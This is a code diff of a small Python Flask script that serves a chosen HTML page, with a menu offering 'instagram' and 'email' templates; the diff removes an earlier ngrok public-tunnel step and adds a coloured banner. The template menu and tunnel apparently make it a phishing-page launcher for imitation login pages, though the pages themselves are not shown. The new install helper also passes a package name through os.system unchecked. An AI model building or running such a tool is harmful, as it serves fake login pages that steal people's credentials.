@@ -1,12 +1,10 @@
 import os
 import sys
-import subprocess
 import logging
-import time
 
-# ---------------- Auto-install modules ----------------
+# -------- Auto-install Flask if missing --------
 def install(package):
-    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+    os.system(f"{sys.executable} -m pip install {package}")
 
 try:
     from flask import Flask, send_from_directory
@@ -15,64 +13,56 @@ except ModuleNotFoundError:
     install("flask")
     from flask import Flask, send_from_directory
 
-try:
-    from pyngrok import ngrok
-except ModuleNotFoundError:
-    print("Installing pyngrok...")
-    install("pyngrok")
-    from pyngrok import ngrok
+# -------- Colors --------
+red = '\033[1;31m'
+grn = '\033[1;32m'
+ylo = '\033[1;33m'
+cyan = '\033[1;36m'
+pink = '\033[1;35m'
+reset = '\033[0m'
 
-# ---------------- Terminal colors ----------------
-RED = '\033[1;31m'
-GREEN = '\033[1;32m'
-YELLOW = '\033[1;33m'
-CYAN = '\033[1;36m'
-RESET = '\033[0m'
-
-# ---------------- Suppress Flask logs ----------------
+# -------- Suppress Flask logs --------
 log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR)
 
-# ---------------- Clear terminal & banner ----------------
-def clear():
-    os.system('cls' if os.name == 'nt' else 'clear')
-
+# -------- Banner --------
 def banner():
-    clear()
-    print(f"""{RED}
+    os.system("cls" if os.name == "nt" else "clear")
+    print(f"""{cyan}
 ██████╗ ██████╗  ██████╗     
 ██╔══██╗██╔══██╗██╔═══██╗    
 ██████╔╝██████╔╝██║   ██║    
 ██╔═══╝ ██╔═══╝ ██║   ██║    
 ██║     ██║     ╚██████╔╝    
 ╚═╝     ╚═╝      ╚═════╝     
-{CYAN}Professional Python Server{RESET}""")
-    print(f"{YELLOW}Made by: Your Dev Friend{RESET}\n")
+{cyan}            PRO D{reset}
+""")
 
-# ---------------- Flask setup ----------------
+# -------- Flask App --------
 app = Flask(__name__)
-selected_html = "1.html"
+selected_html = "1.html"  # default HTML file
 
 @app.route('/')
 def home():
     return send_from_directory(".", selected_html)
 
-# ---------------- Run ----------------
+# -------- Run --------
 if __name__ == "__main__":
     banner()
 
-    # Choose template
-    choice = input(f"{YELLOW}Choose Page Template [1/2]: {RESET}").strip()
+    # ----- Old menu -----
+    print(f"""{pink}
+╔══════════════════════════════╗
+║ {cyan}Choose Page Template{pink}        
+╠══════════════════════════════╣
+║ [1] instagram                  
+║ [2] email                  
+╚══════════════════════════════╝
+{reset}""")
+    choice = input(f"{ylo}Enter your choice (1/2): {reset}").strip()
     selected_html = "1.html" if choice == "1" else "2.html"
 
-    # Server port
     port = 8080
+    print(f"{grn}Server running at: {cyan}http://127.0.0.1:{port}{reset}\n")
 
-    # Start ngrok tunnel
-    print(f"{CYAN}Starting public tunnel via ngrok...{RESET}")
-    public_url = ngrok.connect(port)
-    print(f"{GREEN}Public URL is ready: {public_url}{RESET}")
-    print(f"{GREEN}Local URL: http://127.0.0.1:{port}{RESET}")
-
-    # Run Flask
     app.run(host="127.0.0.1", port=port, debug=False)
